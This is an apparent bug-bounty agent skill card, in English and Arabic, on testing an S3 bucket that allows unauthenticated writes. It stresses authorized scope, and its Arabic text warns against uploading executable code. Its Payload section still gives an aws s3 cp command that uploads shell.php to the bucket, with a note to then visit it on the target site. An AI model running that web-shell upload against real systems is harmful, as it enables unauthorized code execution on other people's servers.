# SKILL: S3 bucket permits writes → assess impact safely

**Skill id:** `tip/s3-bucket-permits-writes-assess-impact-safely`  
**Category:** Recon, RCE  
**Rating:** 📌 للمراجعة  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e88081088418e21cb30456cc  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **Recon, RCE**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

الكتابة غير المصرح بها إلى bucket قد تكون خطيرة، لكنها لا تعني RCE تلقائيًا. يعتمد التنفيذ على إعدادات الاستضافة وربط الـ bucket بالـ webroot وسياسات المعالجة. لا ترفع كودًا تنفيذيًا إلى هدف حي؛ استخدم ملفًا نصيًا غير حساس فقط إذا كانت قواعد البرنامج تسمح، ووثّق قابلية الكتابة دون إحداث أثر.

## Payload / Code

```
aws s3 cp shell.php s3://bucket-name/shell.php --no-sign-request
# بعدين زور [https://target.com/shell.php](https://target.com/shell.php)
```

## Source

Ola Medium writeup 2026 – unauthenticated S3 write to RCE

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
